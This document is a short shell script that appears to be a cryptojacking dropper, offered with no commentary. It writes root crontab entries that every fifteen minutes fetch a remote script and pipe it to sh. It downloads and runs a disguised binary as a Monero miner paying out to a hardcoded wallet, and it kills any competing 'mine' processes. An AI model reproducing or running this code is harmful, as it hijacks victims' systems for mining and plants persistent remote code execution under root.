export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/root1.sh | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/root1.sh | sh" > /var/spool/cron/crontabs/root
curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/coresystems -o /tmp/coresystems
chmod +x /tmp/coresystems
ps auxf | grep -v grep | grep "mine" | awk '{print $2}' |xargs kill -9
/tmp/coresystems -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u 45EngfR9yFHGSGLXMSVh88XuErCN95qQYirYNm4pVaJDakxthy3KWPP2hgDBVaAwcBafup6sefXML3CTYXmZfSJLUfHQQXW -p x
